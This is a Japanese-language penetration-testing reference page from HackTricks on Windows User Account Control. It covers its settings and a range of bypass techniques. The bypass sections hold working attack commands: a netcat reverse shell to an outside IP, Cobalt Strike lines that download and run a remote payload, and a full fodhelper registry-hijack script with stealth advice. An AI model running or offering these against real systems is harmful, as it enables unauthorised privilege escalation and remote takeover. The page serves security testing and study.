# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格が必要な操作に対して同意プロンプトを表示する**機能です。アプリケーションは異なる `integrity` レベルを持ち、**high level** のプログラムは**システムを損なう可能性のある**操作を実行できます。UAC が有効な場合、管理者が明示的にアプリケーション／タスクに管理者レベルのアクセスを許可して実行させない限り、アプリケーションやタスクは常に**非管理者アカウントのセキュリティコンテキストで実行されます**。これは管理者を意図しない変更から守るための利便性機能ですが、セキュリティ境界とは見なされません。

integrity レベルの詳細については：

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、管理者ユーザーには 2 つのトークンが付与されます：通常の操作を行うための標準ユーザー用トークンと、管理者権限を持つトークンです。

この [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ではログオンプロセス、ユーザー体験、UAC アーキテクチャを含め、UAC の動作について詳しく説明されています。管理者はセキュリティポリシーを使用してローカルレベルで UAC の動作を組織向けに構成できます（secpol.msc を使用）、または Active Directory ドメイン環境では Group Policy Objects (GPO) 経由で配布・適用できます。各設定の詳細は [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) に記載されています。UAC に設定できる Group Policy は 10 個あります。以下の表は追加の詳細を示します：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

一部のプログラムは、ユーザーが **administrator group** に属している場合に **自動的に autoelevated** されます。これらのバイナリは内部の _**Manifests**_ に _**autoElevate**_ オプションを _**True**_ として持っています。さらにそのバイナリは **Microsoft によって署名されている必要があります**。

多くの auto-elevate プロセスは **COM objects や RPC servers を通じて機能を公開**しており、これらは medium integrity（通常のユーザーレベル権限）で動作するプロセスから呼び出すことができます。COM (Component Object Model) や RPC (Remote Procedure Call) は、Windows プログラムが異なるプロセス間で通信・関数実行を行うための仕組みです。たとえば **`IFileOperation COM object`** はファイル操作（コピー、削除、移動）を扱うよう設計されており、プロンプトなしで自動的に権限を昇格できることがあります。

プロセスが **System32 directory** から実行されたかをチェックするなど、いくつかのチェックが行われることがあります。これらは例えば **explorer.exe に注入する**などして回避できます（explorer.exe は System32 に配置されています）。

別の回避方法としては **PEB を改変する**ことがあります。Windows の各プロセスは Process Environment Block (PEB) を持ち、実行ファイルのパスなどプロセスに関する重要なデータが含まれます。PEB を変更することで、攻撃者は自身の悪意あるプロセスの実行場所を偽装（spoof）し、信頼されたディレクトリ（例: system32）から実行されているように見せかけることができます。この偽装情報によって COM オブジェクトはユーザーにプロンプトを出さずに自動昇格する場合があります。

その結果、UAC を **バイパス**（**medium** integrity から **high** へ昇格）するために、攻撃者はこの種のバイナリを利用して **任意コードを実行**します。なぜならそのコードは **High level integrity プロセス** のコンテキストで実行されるからです。

バイナリの _**Manifest**_ は Sysinternals のツール _**sigcheck.exe**_ を使って確認できます。(`sigcheck.exe -m <file>`) また、プロセスの **integrity level** は _Process Explorer_ や _Process Monitor_（Sysinternals）で確認できます。

### Check UAC

UAC が有効かどうかを確認するには、以下を実行してください：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
値が **`1`** の場合は UAC が **有効** です。値が **`0`** であるか存在しない場合は UAC が **無効** です。

次に、どの **レベル** が設定されているかを確認します:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** の場合、UAC はプロンプトを表示しません（**無効**のように）
- If **`1`** の場合、管理者は高権限でバイナリを実行するために**ユーザー名とパスワードを要求されます**（Secure Desktop 上）
- If **`2`**（**Always notify me**）の場合、管理者が高権限の何かを実行しようとすると UAC は常に確認を求めます（Secure Desktop 上）
- If **`3`** は `1` と同様ですが、Secure Desktop 上では必要ありません
- If **`4`** は `2` と同様ですが、Secure Desktop 上では必要ありません
- if **`5`**（**default**）の場合、管理者に対して非 Windows バイナリを高権限で実行するか確認を求めます

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### まとめ

- If `EnableLUA=0` or **存在しない場合**, **誰に対しても UAC はありません**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , 誰に対しても UAC はありません**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, RID 500（Built-in Administrator）には UAC はありません**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, 全員に UAC が適用されます**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> 被害者に対してグラフィカルなアクセスがある場合、UAC bypass は非常に簡単です — UAC プロンプトが表示されたら単純に "Yes" をクリックすればよいからです

UAC bypass が必要となる状況は次のとおりです：**UAC が有効で、あなたのプロセスが medium integrity コンテキストで動作しており、あなたのユーザーが administrators グループに属していること**。

重要なのは、UAC が最高のセキュリティレベル（Always）に設定されている場合は、他のいずれかのレベル（Default）よりも **UAC をバイパスするのがはるかに難しい** という点です。

### UAC が無効

もし UAC が既に無効 (`ConsentPromptBehaviorAdmin` は **`0`**) の場合、次のようにして（high integrity level）**execute a reverse shell with admin privileges** を実行できます：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

Administrators グループに属するユーザーのシェルがある場合、新しいドライブにローカルで SMB (file system) 経由の共有を **mount the C$** すれば、ファイルシステム内のすべてに **access to everything inside the file system**（Administrator のホームフォルダも含む）.

> [!WARNING]
> **このトリックはもう動作していないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike の手法は、UAC が最大セキュリティレベルに設定されていない場合にのみ動作します。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には **UAC** を **bypass** するモジュールがいくつかあります。

### KRBUACBypass

ドキュメントとツールは [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) にあります。

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) は複数の UAC bypass exploits を集めた**compilation**です。注意: **compile UACME using visual studio or msbuild** が必要です。**compilation** によりいくつかの実行ファイル（例: `Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されるため、どれが必要かを把握しておく必要があります。\
いくつかの bypass は他のプログラムを**prompt some other programs** して、何かが起きていることを **user** に **alert** する場合があるので、**be careful** してください。

UACME には各 technique が動作し始めた **build version from which each technique started working** が記載されています。自分のバージョンに影響する technique を検索できます:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[this](https://en.wikipedia.org/wiki/Windows_10_version_history) ページを使うと、ビルド バージョンから Windows リリース `1607` を確認できます。

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼されたバイナリである `fodhelper.exe` は、最新の Windows で自動的に昇格されます。起動時に、`DelegateExecute` verb を検証せずに下記のユーザー別レジストリパスを参照します。そこにコマンドを仕込むことで、Medium Integrity プロセス（ユーザーが Administrators に属している場合）が UAC prompt なしで High Integrity プロセスを生成できます。

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell の手順（payload をセットしてから trigger）:
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
注意:
- 現在のユーザーが Administrators のメンバーで、UAC レベルがデフォルト/寛容（追加制限のある Always Notify ではない）である場合に動作します。
- `sysnative` パスを使用して、64-bit Windows 上の 32-bit プロセスから 64-bit PowerShell を起動します。
- ペイロードは任意のコマンド（PowerShell、cmd、または EXE パス）にできます。ステルスのため、プロンプトを表示する UI は避けてください。

#### More UAC bypass

ここで使われている AUC 回避の**すべて**の手法は、被害者とのフルインタラクティブシェルを**必要とします**（一般的な nc.exe シェルでは不十分です）。

meterpreter セッションを使って取得できます。**process** を Session 値が **1** のものにマイグレートしてください:

![](<../../images/image (863).png>)

(_explorer.exe_ が動作するはずです)

### UAC Bypass with GUI

GUI にアクセスできるなら、UAC プロンプトが出たときに単に承認すればよく、実際には回避は不要です。したがって、GUI へのアクセスを得ることで UAC をバイパスできます。

さらに、誰かが使っていた GUI セッション（例えば RDP を介したもの）を取得すると、管理者として動作しているツールが存在し、そこから例えば cmd を **as admin** で直接実行でき、UAC による再プロンプトを受けない場合があります（例: [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)）。これは多少 **ステルス性が高い** かもしれません。

### Noisy brute-force UAC bypass

ノイズを気にしないなら、[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなものを実行して、ユーザーが承諾するまで権限昇格を要求し続けることもできます。

### Your own bypass - Basic UAC bypass methodology

UACME を見ると、ほとんどの UAC バイパスが Dll Hijacking の脆弱性を悪用していることがわかります（主に悪意のある dll を _C:\Windows\System32_ に書き込む）。[Dll Hijacking 脆弱性を見つける方法を読む](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 自動昇格するバイナリを見つける（実行時に high integrity level で動作することを確認する）。
2. procmon を使って、DLL Hijacking の脆弱性がある可能性のある "**NAME NOT FOUND**" イベントを探す。
3. 書き込み権限のない保護されたパス（例: C:\Windows\System32）に DLL を書き込む必要があるかもしれません。これを回避する方法として:
1. **wusa.exe**: Windows 7,8 and 8.1。CAB ファイルの内容を保護されたパスに展開できる（このツールは high integrity level で実行されるため）。
2. **IFileOperation**: Windows 10。
4. DLL を保護されたパスにコピーして、脆弱で autoelevated なバイナリを実行する **script** を用意する。

### Another UAC bypass technique

これは、**autoElevated binary** が実行される **binary** や **command** の **name/path** をレジストリから **read** しようとするかを監視する手法です（特に、そのバイナリがこの情報を **HKCU** の中で検索する場合に興味深い）。

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
